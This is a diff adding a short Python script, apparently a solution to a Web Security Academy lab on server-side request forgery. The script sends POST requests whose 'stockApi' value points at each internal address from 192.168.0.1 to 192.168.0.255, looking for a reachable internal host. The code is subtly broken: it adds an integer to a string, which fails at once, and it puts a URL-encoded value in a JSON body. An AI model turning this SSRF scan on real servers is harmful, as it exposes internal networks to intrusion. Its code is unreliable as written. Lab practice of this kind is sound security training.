@@ -1,0 +1,19 @@
+import requests
+import time
+
+"""
+Burp intruder on community addition is slow as snails, so lets use a python script to do it faster.
+
+According to the lab details, we need to run through the ip range, sending POST requests until we find a 200 response, meaning that we found something we can actually use.
+X needs to go from 1 to 255.
+"""
+
+url = "https://0a3c00e303e0076d8080211b00340005.web-security-academy.net/product?productId=7"
+
+for i in range(1, 256):
+  payload = {"stockApi": ("http%3A%2F%2F192.168.0." + i)}
+  response = requests.post(url, json=payload)
+  if response.status_code == 200:
+    print("192.168.0." + i)
+    break
+  time.sleep(0.1)
